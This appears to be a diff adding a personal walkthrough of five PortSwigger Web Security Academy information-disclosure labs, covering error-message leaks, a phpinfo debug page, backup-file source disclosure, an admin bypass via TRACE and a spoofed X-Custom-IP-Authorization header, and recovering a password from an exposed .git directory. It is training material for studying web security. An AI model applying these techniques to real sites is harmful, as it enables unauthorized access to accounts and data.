@@ -1,0 +1,94 @@
+Task 1:
+///Lab: Information disclosure in error messages///
+
+Open the lab in burp. Our mission is to see some error messages. To do this, click on any products. And in the url you will see something like this:
+https://0a9c00e804b541188164e8ef00df007a.web-security-academy.net/product?productId=1
+Change the product id to something not number like "asd":
+Internal Server Error: java.lang.NumberFormatException: For input string: ""asd""
+	at java.base/java.lang.NumberFormatException.forInputString(NumberFormatException.java:67)
+	at java.base/java.lang.Integer.parseInt(Integer.java:647)
+...
+...
+...
+	at java.base/java.lang.Thread.run(Thread.java:1583)
+
+Apache Struts 2 2.3.31
+
+Submit the apache version...
+
+Task 2:
+///Lab: Information disclosure on debug page///
+
+Open the page in burp, and check the source...you will find a lane like this:
+                   <!-- <a href=/cgi-bin/phpinfo.php>Debug</a> -->
+So open this page:
+https://0a3a00ca041d9e5e811207b8002c001b.web-security-academy.net/cgi-bin/phpinfo.php
+And there is a lot of information here...search for the secret key, and submit what you found.
+
+Task 3:
+///Lab: Source code disclosure via backup files///
+
+Open the page in burp. If you remember there is always a robots.txt, if you open that file, you will see there is a /backup directory with a file called ProductTemplate.java.bak.
+Open the file and search out the password which is hardcoded in the file.
+
+Task 4:
+///Lab: Authentication bypass via information disclosure///
+
+Open the page in burp and log in as wiener/peter. Send the GET /my-account?id=wiener request to repeater. Change it to /admin.
+In the response you can see you can access only if you are localhost. To simulate this change the method to TRACE and send the request:
+HTTP/2 200 OK
+Content-Type: message/http
+X-Frame-Options: SAMEORIGIN
+Content-Length: 667
+
+TRACE /admin HTTP/1.1
+Host: 0aae0053047d353e81fdb66300490026.web-security-academy.net
+user-agent: Mozilla/5.0 (X11; Linux x86_64; rv:149.0 Gecko/20100101 Firefox/149.0
+...
+...
+te: trailers
+x-custom-ip-authorization: 188.36.20.172
+cookie: session=zOX2KlbKXzKCQE8GSvkvGdGquL8oWsBV
+Content-Length: 0
+
+So the X-custom-ip-authorization is the header which we have to simulate. To do this go to proxy/Match and replace. Add a new HTTP match leave everything unchaged, change only the replace field to this:
+X-Custom-IP-Authorization: 127.0.0.1
+Click to ok, and refresh your browser. Now you have admin panel...delete carlos and the lab is solved.
+
+Task 5:
+///Lab: Information disclosure in version control history///
+
+Open the site in burp. Paste the /.git to the end of the URL, and you will see the repository of the site. get the whole repo with
+wget -r https://0a8300660447a0cb81434dbe00eb00f3.web-security-academy.net/.git/
+If you open 1 by 1 the files in the file called "COMMIT_EDITMSG" you will find this:
+'Remove admin password from config'
+This means that the admin password was in a config file. But the site saves the actions in a log file, so go into the log directory, and there will be a file called HEAD. If you open it you will find this:
+0000000000000000000000000000000000000000 2c1be2ad10b5616d0d8e67354c1f86f887ba8f3f Carlos Montoya <carlos@carlos-montoya.net> 1775564009 +0000	commit (initial): Add skeleton admin panel
+2c1be2ad10b5616d0d8e67354c1f86f887ba8f3f ecfd28c85a3130cb5ce82ae08de72892e8411bd8 Carlos Montoya <carlos@carlos-montoya.net> 1775564009 +0000	commit: Remove admin password from config
+The secont commit is the deleting commit. To win out this log type this into your terminal:
+git show 2c1be2ad
+This will look like this:
+[adam@adam-82xv .git]$ git show 2c1be2ad10b5616d0d8e67354c1f86f887ba8f3f
+commit 2c1be2ad10b5616d0d8e67354c1f86f887ba8f3f
+Author: Carlos Montoya <carlos@carlos-montoya.net>
+Date:   Mon Jun 22 16:23:42 2020 +0000
+
+    Add skeleton admin panel
+
+diff --git a/admin.conf b/admin.conf
+new file mode 100644
+index 0000000..95500ae
+--- /dev/null
++++ b/admin.conf
+@@ -0,0 +1 @@
++ADMIN_PASSWORD=14xkxlwtay55dlayuddt
+diff --git a/admin_panel.php b/admin_panel.php
+new file mode 100644
+index 0000000..8944e3b
+--- /dev/null
++++ b/admin_panel.php
+@@ -0,0 +1 @@
++<?php echo 'TODO: build an amazing admin panel, but remember to check the password!'; ?>
+\ No newline at end of file
+There is the admin password. Log in as administrator and delete carlos.
+
